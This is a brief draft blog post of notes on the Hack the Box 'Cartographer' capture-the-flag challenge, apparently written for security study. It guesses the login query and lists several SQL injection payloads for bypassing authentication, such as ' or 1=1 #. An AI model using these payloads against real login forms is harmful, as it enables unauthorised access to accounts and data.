---
title: "Hack the Box——Cartographer"
date: 2020-02-17T18:28:06+08:00
showDate: true
draft: true
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---



可能的sql

`SELECT * FROM users WHERE username='' and password=''`

payload

`username`=`' or 1=1 #`&`password`=``

`username`=`' or '1'='1`&`password`=`' or '1'='1`

`username`=`' or '1`&`password`=`' or '1`

`username`=`admin'or'1'='1`&`password`=`` （前提是知道用户名）


`SELECT password FROM username`

